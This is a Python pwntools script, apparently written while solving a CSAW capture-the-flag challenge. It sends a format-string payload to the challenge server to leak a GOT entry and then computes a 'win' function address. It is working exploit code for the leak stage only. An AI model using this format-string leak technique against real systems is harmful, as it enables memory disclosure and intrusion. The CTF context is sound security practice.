from pwn import *
context.log_level = 'error'

def exploit():
    p = remote("pwn.chal.csaw.io", 8000)
    p.recvuntil(b"GOT milk? ")
    # Leak lose GOT entry
    p.sendline(p32(0x804a010) + b"%7$s")
    data = p.recvuntil(b"\n\nNo flag for you!\n")
    # Extract leaked address (after the 4 address bytes)
    idx = data.index(b"\x10\xa0\x04\x08") + 4
    leak = u32(data[idx:idx+4])
    log.info("leaked lose = %#x" % leak)
    libc_base = leak - 0x11f8
    win = libc_base + 0x1189
    log.info("libc base = %#x, win = %#x" % (libc_base, win))
    p.close()
    return win

win = exploit()
print("win = %#x" % win)
end_of_edit

